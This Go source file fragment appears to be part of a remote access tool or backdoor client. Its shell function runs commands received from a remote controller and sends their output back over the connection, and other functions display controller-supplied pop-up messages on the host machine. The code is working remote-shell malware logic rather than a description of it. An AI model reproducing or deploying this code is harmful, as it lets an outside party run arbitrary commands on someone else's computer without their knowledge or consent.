package main

import (
	"fmt"
	"strconv"
	"strings"
	"time"
)

func shell(client *Client) {
	fmt.Println("Step into the shell...")
	for {
		order, _ := client.receiveData()
		if order == "exitSHELL" {
			fmt.Println("Exited Shell")
			return
		}
		res := RunCommand(order) + RESV_ACCOMPLISH
		MsgLen, err := client.conn.Write([]byte(res))
		isSend := chkErrorNoExit(err)
		if isSend {
			fmt.Println("Sent " + strconv.Itoa(MsgLen) + " bytes")
			fmt.Println(time.Now().Format("2006-01-02 15:04:05") + " Order Run Successful!")
		} else {
			continue
		}
	}
}

func processChatBox(client *Client) bool {
	client.sendData("ok_CHAT" + RESV_ACCOMPLISH)
	rawMsg, _ := client.receiveData()
	var processedString []string = strings.Split(rawMsg, "SEEUNEXTTIME!")
	go chatBox(processedString[0], processedString[1])
	client.sendData("ok_POP" + RESV_ACCOMPLISH)
	return true
}

func chatBox(msg string, msgtype string) {
	if msgtype == "1" {
		MessageBox("提示", msg, MB_ICONASTERISK)
	} else if msgtype == "2" {
		MessageBox("警告", msg, MB_ICONWARNING)
	} else if msgtype == "3" {
		MessageBox("错误", msg, MB_ICONERROR)
	} else {
		MessageBox("提示", msg, MB_OK)
	}
}
